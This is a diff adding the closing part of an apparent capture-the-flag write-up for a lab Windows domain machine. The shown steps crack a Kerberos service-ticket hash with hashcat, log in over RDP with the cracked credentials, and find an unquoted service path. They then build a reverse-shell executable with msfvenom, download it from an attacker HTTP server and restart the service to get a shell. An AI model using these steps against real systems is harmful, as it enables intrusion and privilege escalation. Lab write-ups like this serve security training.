@@ -68,3 +68,73 @@ GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi! -request
 
 FOTO
 
+Let's save that hash and use hashcat to crack it.
+
+```shell
+hashcat -a 0 -m 13100 hash /home/m4luk0/wordlists/rockyou.txt
+```
+
+FOTO
+
+Let's try to connect via RDP to the machine.
+
+```shell
+xfreerdp /u:bitbucket /p:littleredbucket /v:lab.enterprise.thm /dynamic-resolution
+```
+
+FOTO
+
+If we enumerate the machine, we can find the [unquoted service](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#unquoted-service-paths) vulnerability wich is based on the fact that when windows has to read a path with spaces, i.e. C:\Windows\Hello World\test.exe windows will execute hello.exe, world.exe and then it will enter the directory; then, if we create a malicious exe called hello.exe it will execute it before entering that directory.
+
+In windows:
+
+```shell
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
+```
+
+FOTO
+
+We see that there is a directory called Zero Tier One, we will exploit the vulnerability explained above, we will create on our machine a malicious exe that will send us a shell.
+
+```shell
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o Zero.exe
+```
+
+FOTO
+
+Now we are going to create a python server to pass it to windows.
+
+```shell
+python3 -m http.server
+```
+
+FOTO
+
+Let's set the port to listen.
+
+```shell
+nc -lvp PORT
+```
+
+FOTO
+
+In windows go to the folder and download the exe.
+
+```shell
+cd "C:\Program Files (x86)\Zero Tier"
+wget http://10.8.155.220:8000/Zero.exe -o Zero.exe
+```
+
+FOTO
+
+Now having everything ready we will only have to restart the service.
+
+```shell
+Start-Service -name "zerotieroneservice"
+```
+
+FOTO
+
+FOTO
+
+And so we would finish with this machine, thanks for reading.
